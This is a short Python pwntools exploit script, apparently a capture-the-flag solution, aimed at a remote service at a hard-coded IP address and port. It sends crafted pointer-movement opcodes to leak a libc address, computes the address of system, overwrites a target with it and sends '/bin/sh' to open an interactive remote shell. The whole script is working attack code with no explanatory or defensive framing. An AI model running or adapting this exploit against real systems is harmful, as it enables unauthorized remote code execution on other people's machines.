#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

#host = "10.211.55.6"
#port = 8888
host = "69.90.132.40"
port = 4001
r = remote(host,port)

back = ":<"
fo = ":>"
sub = ":-"
plus = ":+"
getchar = ":."
putchar = "::"

main = p32(0x80486de)
op =  back*0x20 + getchar + putchar + fo + putchar + fo + putchar + fo*0xe
op += (getchar + fo)*4
op += (getchar + fo)*4
print hex(len(op))
r.recvuntil(":")
r.sendline(op)
r.send('\x0c')
raw_input()
data = r.recv(3) + '\xf7'
printf = u32(data)
#libc = puts - 0x49670
libc = printf - 0x0049020 
print "libc:",hex(libc)
#system = libc + 0x3ada0
system = libc + 0x0003a940
r.send(main)
r.send(p32(system))

r.recvuntil(":")
r.sendline("/bin/sh")
r.interactive()

